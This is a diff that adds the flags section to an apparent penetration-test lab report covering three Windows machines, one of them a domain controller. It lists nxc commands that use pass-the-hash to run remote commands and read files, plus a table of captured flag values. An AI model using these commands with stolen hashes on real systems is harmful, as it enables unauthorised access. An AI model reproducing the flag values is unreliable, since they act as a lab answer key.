@@ -399,5 +399,32 @@ The krbtgt hash is the domain's Kerberos master key — possession of it allows 
 
 ## 10.0 Flags
 
-- **local.txt** (ERA — local Administrator): *(pending)*
-- **proof.txt** (DC01 — Domain Administrator): *(pending)*
+We collected five flags — one `proof.txt` per machine, plus `local.txt` on the two machines where we held a user foothold.
+
+- `local.txt` sits on the Desktop of the first foothold user (`apache` on ERA, `charlotte` on DC01).
+- `proof.txt` sits on the Desktop of the local Administrator (`Administrator.DC01` on the DC).
+
+SECURE (.95) has no `local.txt` — we jumped straight to SYSTEM through the ManageEngine upload, so there was no user foothold to capture.
+
+We used `nxc` to find them: list the Desktop, search recursively, then read the file.
+
+```bash
+# list Administrator Desktop
+nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'dir C:\Users\Administrator\Desktop\'
+
+# search local.txt / root.txt recursively
+nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'where /r C:\Users local.txt root.txt'
+
+# read a flag
+nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'type C:\Users\<user>\Desktop\<flag>'
+```
+
+One gotcha: ERA’s Administrator is a **local** account, so we had to add `--local-auth`. SECURE and the DC use domain accounts.
+
+| Machine | Flag | Path | Value |
+|---|---|---|---|
+| SECURE (.95) | proof.txt | `C:\Users\Administrator\Desktop\proof.txt` | `ee73679ebe21b05ed7ffd49ef47b8574` |
+| ERA (.96) | local.txt | `C:\Users\apache\Desktop\local.txt` | `4d4a472223937f42204fddf7b4bc1f4b` |
+| ERA (.96) | proof.txt | `C:\Users\Administrator\Desktop\proof.txt` | `5f01668ca7c20176d7578d8b58cfaaf2` |
+| DC01 (.97) | local.txt | `C:\Users\charlotte\Desktop\local.txt` | `d1b77d0baa79cc2722b9f10bfb513dc2` |
+| DC01 (.97) | proof.txt | `C:\Users\Administrator.DC01\Desktop\proof.txt` | `4903e006054592d4c58f6550c41d8741` |
